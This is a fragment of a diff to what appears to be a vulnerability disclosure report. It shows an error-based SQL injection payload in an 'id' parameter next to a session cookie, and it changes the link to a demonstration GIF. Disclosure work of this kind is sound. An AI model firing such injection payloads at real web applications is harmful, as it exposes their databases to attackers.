@@ -30,5 +30,5 @@ Cookie: PHPSESSID=h4hpbcj74nsiroalrkj8o2251s
 id=2'and/**/extractvalue(1,concat(char(126),database()))and'
 ```
 
-![](https://github.com/mikeccltt/badminton-center-management-system/blob/main/sql.gif?raw=true)
+![](https://github.com/mikeccltt/bug_report_CVE/blob/main/room-rent-portal-site/sql.gif?raw=true)
 
